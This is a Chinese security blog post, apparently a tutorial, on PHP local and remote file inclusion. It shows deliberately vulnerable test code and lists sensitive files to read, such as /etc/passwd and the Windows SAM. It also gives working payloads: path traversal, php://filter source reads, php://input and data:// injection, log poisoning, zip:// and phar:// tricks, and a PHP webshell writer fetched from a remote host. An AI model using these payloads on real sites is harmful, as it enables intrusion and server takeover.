@@ -1,0 +1,829 @@
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+    
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="WEB-文件包含, wh1te">
+    <meta name="description" content="About WEB Security
+
+
+文件包含漏洞文件包含漏洞，通过包含的内容不同区分为本地文件包含和远程文件包含。服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可去包含一个恶意文件，而我们可以构">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>WEB-文件包含 | wh1te</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+</head>
+
+</head>
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="container">
+            <div class="nav-wrapper">
+                <div class="brand-logo">
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <img src="/medias/logo.png" class="logo-img hide-on-small-only">
+                        
+                        <span class="logo-span">wh1te</span>
+                    </a>
+                </div>
+                <a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>Index</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>Tags</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>Categories</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>Archives</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>About</span>
+        </a>
+    </li>
+    
+    <li>
+        <a id="toggleSearch" class="waves-effect waves-light">
+            <i id="searchIcon" class="mdi-action-search"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div class="side-nav" id="mobile-nav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">wh1te</div>
+        <div class="logo-desc">
+            
+            不忘初心，方得始终
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                Index
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                Tags
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                Categories
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                Archives
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                About
+            </a>
+        </li>
+        
+        
+    </ul>
+
+    <div class="social-link"><a href="https://github.com/lddp" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <i class="fa fa-github"></i>
+</a>
+<a href="mailto:1061722245@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <i class="fa fa-envelope-open"></i>
+</a>
+<a href="#!" class="tooltipped" data-tooltip="QQ联系我: 1061722245" data-position="top" data-delay="50">
+    <i class="fa fa-qq"></i>
+</a>
+</div>
+</div>
+
+            </div>
+        </div>
+
+        
+    </nav>
+</header>
+
+
+
+
+
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        WEB-文件包含
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1,
+    #articleContent h2,
+    #articleContent h3,
+    #articleContent h4,
+    #articleContent h5,
+    #articleContent h6 {
+        padding-top: 76px;
+        margin-top: -76px;
+    }
+
+    #articleContent h1 {
+        line-height: 3.5rem;
+    }
+
+    #articleContent h2 {
+        line-height: 3.2rem;
+    }
+
+    #articleContent h3 {
+        line-height: 2.8rem;
+    }
+
+    #articleContent h4 {
+        line-height: 2.5rem;
+    }
+
+    #articleContent h5 {
+        line-height: 2.2rem;
+    }
+
+    #articleContent h6 {
+        line-height: 1.9rem;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            
+            <div class="article-tag">
+                
+                <a href="/tags/Note/" target="_blank">
+                    <span class="chip bg-color">Note</span>
+                </a>
+                
+                <a href="/tags/WEB/" target="_blank">
+                    <span class="chip bg-color">WEB</span>
+                </a>
+                
+            </div>
+            
+            <div class="post-info">
+                
+                <span class="post-cate">
+                    <i class="fa fa-bookmark fa-fw icon-category"></i>
+                    
+                    <a href="/categories/Skill/" class="post-category" target="_blank">
+                        Skill
+                    </a>
+                    
+                </span>
+                
+
+                <span class="post-date">
+                    <i class="fa fa-clock-o fa-fw"></i>2018-11-09
+                </span>
+            </div>
+        </div>
+        <hr>
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>About WEB Security</p>
+<a id="more"></a>
+
+<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>文件包含漏洞，通过包含的内容不同区分为本地文件包含和远程文件包含。服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可去包含一个恶意文件，而我们可以构造这个恶意文件来达到邪恶的目的。</p>
+<h4 id="产生漏洞原因"><a href="#产生漏洞原因" class="headerlink" title="产生漏洞原因"></a>产生漏洞原因</h4><p>程序员在进行代码书写时，一些重复用到的代码或者函数会被封装起来，作为单独的一个文件，在用到时，使用一些加载函数加载进来。或者是加载某些图片或者是外部的文件，也会用到这些函数。</p>
+<h4 id="文件包含涉及到的函数"><a href="#文件包含涉及到的函数" class="headerlink" title="文件包含涉及到的函数"></a>文件包含涉及到的函数</h4><pre><code class="php">require
+include</code></pre>
+<p>这两种结构除了在如何处理失败之外完全一样。include() 产生一个警告而 require() 则导致一个致命错误。换句话说，如果你想在遇到丢失文件时停止处理页面就用 require()。include() 就不是这样，脚本会继续运行。<br>如果”allow_url_fopen”在 PHP 中被激活（默认配置），也可以用 URL（通过 HTTP 或者其它支持的封装协议）而不是本地文件来指定要被包括的文件。如果目标服务器将目标文件作为 PHP 代码解释，则可以用适用于HTTP GET 的 URL 请求字符串来向被包括的文件传递变量。</p>
+<pre><code class="php">require_once
+include_once</code></pre>
+<p>require_once ()和include_once() 语句在脚本执行期间包括并运行指定文件。此行为和 require() 语句类似，唯一区别是如果该文件中的代码已经被包括了，则不会再次包括。适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
+<h4 id="测试案例"><a href="#测试案例" class="headerlink" title="测试案例"></a>测试案例</h4><pre><code class="php">&lt;?php
+@$f = $_GET[&#39;file&#39;];
+require($f);
+?&gt;</code></pre>
+<pre><code class="php">&lt;?php
+$file = $_GET[&#39;file&#39;];
+if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){
+    include($file);
+}
+?&gt;
+
+&lt;?php
+$file = $_GET[&#39;file&#39;];
+include($file.&#39;.jpg&#39;);
+?&gt;</code></pre>
+<p>windows下的phpstudy或者wamp以及linux下的lamp环境都可以。</p>
+<h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><p>第一步就是想尽各种办法搜集主机信息了，看看是linux还是windows。比如：</p>
+<pre><code class="php">http://www.xxx.com/index.php?page=hello.php</code></pre>
+<p>hello.php肯定是不存在的，看看服务器会不会报错，根据报错情况进行判断。windows无非就是D:\www\index.php，linux就是\var\www\html\index.php,，或者是通过抓包，看http请求包或者响应包的内容来进行判断，大致就是这个意思。<br>windows敏感信息：</p>
+<pre><code class="php">c:\boot.ini
+c:\windows\systems32\inetsrv\MetaBase.xml
+c:\windows\repair\sam
+c:\windows\php.ini             php配置文件
+c:\windows\my.ini               mysql配置文件</code></pre>
+<p>linux敏感信息：</p>
+<pre><code class="php">/etc/passwd
+/usr/local/app/apache2/conf/http.conf
+/usr/local/app/php5/lib/php.ini          PHP相关设置
+/etc/httpd/conf/http.conf                    apache配置文件
+/etc/my.cnf                             mysql配置文件</code></pre>
+<h5 id="1-包含本地敏感文件"><a href="#1-包含本地敏感文件" class="headerlink" title="1.包含本地敏感文件"></a>1.包含本地敏感文件</h5><p>比如权限够高，可以读取/etc/passwd等敏感文件的内容，或者是通过目录扫描的方式来包含敏感文件。</p>
+<p>使用测试案例第一个：</p>
+<pre><code class="bash">http://www.xxx.com/require.php?page=../../../etc/passwd</code></pre>
+<h5 id="2-包含正常文件"><a href="#2-包含正常文件" class="headerlink" title="2.包含正常文件"></a>2.包含正常文件</h5><p>文件包含时，当文件是php文件的时候，文件包含会直接执行php文件，如果不是php文件，则会直接读取内容，看内容中有没有php代码，如果有，就把其当作代码去执行，没有就直接把内容展示出来。</p>
+<p>基于上面的描述，当出现文件包含漏洞的时候，也可以在网站内找文件上传点，然后通过包含正常的图片，或者包含网站允许上传的文件内容，就可以轻松的getshell。比如上传一个内容如下所示的jgp文件：</p>
+<pre><code class="php">&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;aa&#39;]);?&gt;&quot;)?&gt;</code></pre>
+<p>也可以再加一些16进制的文件头伪装一下，都是不影响脚本执行的。</p>
+<h5 id="3-包含日志文件"><a href="#3-包含日志文件" class="headerlink" title="3.包含日志文件"></a>3.包含日志文件</h5><p>对WEb服务器发起的每一次请求都会被记录在WEB服务器的日志文件中，所以，当构造请求为：</p>
+<pre><code class="bash">http://www.xxx.com/&lt;?php @eval($_POST[&#39;aa&#39;])?&gt;</code></pre>
+<p>日志文件中就会留存这样的一条记录，保存完整的url。之后借助第二条的文件包含漏洞利用方式，把日志文件包含进来，然后服务器发现里面的php代码，就会去执行php代码。这种操作最好在凌晨12点进行，因为刚好服务器的日志会重新简历，日志文件没有那么大，不然会出现很多意想不到的情况。</p>
+<h5 id="4-php伪协议"><a href="#4-php伪协议" class="headerlink" title="4.php伪协议"></a>4.php伪协议</h5><p>php伪协议内容：</p>
+<pre><code class="php">ile:// — 访问本地文件系统
+http:// — 访问 HTTP(s) 网址
+ftp:// — 访问 FTP(s) URLs
+php:// — 访问各个输入/输出流（I/O streams）
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+glob:// — 查找匹配的文件路径模式
+phar:// — PHP 归档
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — 音频流
+expect:// — 处理交互式的流</code></pre>
+<p>php伪协议实际上就是支持的协议与封装协议。</p>
+<h6 id="4-1-php-filter利用php伪协议以base64加密的方式去读取文件内容"><a href="#4-1-php-filter利用php伪协议以base64加密的方式去读取文件内容" class="headerlink" title="4.1 php://filter利用php伪协议以base64加密的方式去读取文件内容"></a>4.1 php://filter利用php伪协议以base64加密的方式去读取文件内容</h6><pre><code class="bash">http://www.xxx.com/require.php?page=php://filter/read=convert.base64-encode/resource=config.php</code></pre>
+<p>这样就可以读取到一个php文件内容了。</p>
+<h6 id="4-2-写入php文件"><a href="#4-2-写入php文件" class="headerlink" title="4.2 写入php文件"></a>4.2 写入php文件</h6><p><b>php://input</b></p>
+<p>这个写入需要一定的条件，当apache的配置选项allow_url_include为on的时候，就是开启这个选项的时候，就可以构造写入文件的pyload进行写入木马：</p>
+<pre><code class="bash">http://www.xxx.com/index.php?page=php://input
+并需要POST过去一个数据：
+&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;aa&#39;]);?&gt;&quot;)?&gt;</code></pre>
+<p>这样，就可以把成功生成一个shell.php文件了。</p>
+<p><b>data:text/plain;</b><br>利用 php 的数据协议 data:// 可以查看文件源代码，前提是 php.ini 中的 allow_url_fopen 和 allow_url_include 两个配置为 on, 当然也可以写入文件：</p>
+<pre><code class="bash">data:text/plain,&lt;?php phpinfo();?&gt;
+data:text/plain;PD9waHAgcGhwaW5mbygpOz8+</code></pre>
+<p>这上面其实是一个payload，只不过一个使用了base64加密，一个没有。两个的语法区别在于使用base64加密的，使用分号隔离，没有使用base64加密的使用逗号隔离。</p>
+<h6 id="4-3-zip"><a href="#4-3-zip" class="headerlink" title="4.3 zip//"></a>4.3 zip//</h6><p>这个方法用于，服务器验证上传文件的特定后缀，比如下面这样的：</p>
+<pre><code class="php">&lt;?php
+$file = $_GET[&#39;file&#39;];
+if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){
+    include($file);
+}
+?&gt;
+
+&lt;?php
+$file = $_GET[&#39;file&#39;];
+include($file.&#39;.jpg&#39;);
+?&gt;</code></pre>
+<p>一种情况是截取文件的后缀名，一种是直接给文件名字后面加上后缀名。两种方式，都可以有效阻止非法文件包含。（有人说00截断，00截断在下篇说）<br>这时候，就需要使用zip://这样的骚操作了。</p>
+<p>先写一个一句话木马的php脚本（脚本内容可以是上面4.2POST过去的数据内容），然后打成压缩包，之后访问：</p>
+<pre><code class="bash">http://www.xxx.com/index.php?page=zip://var/www/html/php.zip%23shell.php</code></pre>
+<p>这样就可以成功实现getshell，不过这种方法有两点需要注意：<br>1.压缩包文件名字跟压缩包内的脚本文件名中间加一个#号，但#号必须使用URL编码%23<br>2.必须使用绝对路径</p>
+<h6 id="4-4-phar"><a href="#4-4-phar" class="headerlink" title="4.4 phar://"></a>4.4 phar://</h6><p>首先需要用phar类打一个phar标准包：</p>
+<pre><code class="php">&lt;?php
+$p = new PharData(dirname(__FILE__).&#39;/phartest2.zip&#39;, 0,&#39;phartest2&#39;,Phar::ZIP) ; 
+$x=file_get_contents(&#39;./php.php&#39;);
+$p-&gt;addFromString(&#39;a.jpg&#39;, 
+$x); 
+?&gt;</code></pre>
+<p>然后会生成一个zip文件，这时候构造payload：</p>
+<pre><code class="bash">http://www.xxx.com/index.php?page=phar://php.zip/shell.php</code></pre>
+<p>这时候，就可以尝试getshell了。</p>
+<p>（PS：伪协议这个其实好多，下篇再慢慢解释）</p>
+<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>如果PHP的配置选项allow_url_include为ON的话，则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞。</p>
+<p>远程文件包含的利用方式其实比较单一，只不过远程文件包含的话，包含的东西是在自己可控的公网服务器中，比如公网服务器中存在一个1.txt可以访问的到，1.txt内容如下：</p>
+<pre><code class="php">&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;aa&#39;]);?&gt;&quot;)?&gt;</code></pre>
+<p>构造payload：</p>
+<pre><code class="php">http://www.xxx.com/index.php?page=http://1.1.1.1/1.txt</code></pre>
+<p>这样利用php文件包含的特性，就可以在目标服务器中写入webshell了。</p>
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>关于文件包含，还有一个小技巧没有写上去，下一篇会写上去00截断的一些东西，最近忙于实习工作，都得挤时间写博客啊。最近把自己会的WEB方面的漏洞以及渗透测试的技巧什么的，都写一写，再放一些工具福利什么的。</p>
+<p>致谢：</p>
+<p><a href="https://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="noopener">I3m0n-文件包含漏洞</a></p>
+<p><a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html" target="_blank" rel="noopener">Tomayo’s-zip或phar协议包含文件</a></p>
+<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80598768" target="_blank" rel="noopener">配合php协议进行文件包含漏洞</a></p>
+<p><a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">利用php伪协议实现命令执行的七种姿势</a></p>
+
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff;
+        background-color: #22AB38;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff;
+        background-color: #019FE8;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs">
+                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
+                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                    </ul>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('#reward .reward-link').on('click', function () {
+            $('#rewardModal').openModal();
+        });
+
+        $('#rewardModal .close').on('click', function () {
+            $('#rewardModal').closeModal();
+        });
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone, qq, weibo, douban"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">Reprint please specify: </span>
+                    <a href="http://yoursite.com" class="b-link-green">wh1te</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2018/11/09/WEB-文件包含/" class="b-link-green">WEB-文件包含</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">Previous</div>
+            <div class="card">
+                <a href="/2018/11/21/WEB-00截断与-00截断/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="WEB-00截断与%00截断">
+                        
+                        <span class="card-title">WEB-00截断与%00截断</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">About WEB Security
+
+
+00截断与%00截断在文件上传的时候，经常会遇到对上传文件的后缀名做限制的，有时候用00截断，有时候用%00截断，一直比较懵逼，就在这里做下解释。
+%00截断%00的使用是在路径上！
+%00的使用是</div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2018-11-21
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Skill/" class="post-category" target="_blank">
+                                    Skill
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Note/" target="_blank">
+                        <span class="chip bg-color">Note</span>
+                    </a>
+                    
+                    <a href="/tags/WEB/" target="_blank">
+                        <span class="chip bg-color">WEB</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">Next</div>
+            <div class="card">
+                <a href="/2018/10/24/windows应急响应以及安全巡检/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="windows应急响应以及安全巡检">
+                        
+                        <span class="card-title">windows应急响应以及安全巡检</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">About Windows Emergency response
+
+
+Windows1. 日志和记录应用程序日志、系统日志、安全日志；默认情况下，如果系统不对事件做审核则不会生成安全日志。
+开始→设置→控制面板→管理工具→事件查看器
+Win</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Windows/" class="post-category" target="_blank">
+                                    Windows
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Windows/" target="_blank">
+                        <span class="chip bg-color">Windows</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title">TOC</div>
+            <div id="toc-content">
+
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://lddp.github.io/" target="_blank">wh1te</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 采用
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>的主题搭建.
+        </div>
+        <div class="col s12 m4 l4 social-link"><a href="https://github.com/lddp" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <i class="fa fa-github"></i>
+</a>
+<a href="mailto:1061722245@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <i class="fa fa-envelope-open"></i>
+</a>
+<a href="#!" class="tooltipped" data-tooltip="QQ联系我: 1061722245" data-position="top" data-delay="50">
+    <i class="fa fa-qq"></i>
+</a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title">Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input" autofocus="">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/js/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+<script type="text/javascript" src="/js/love.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+</body>
+</html>
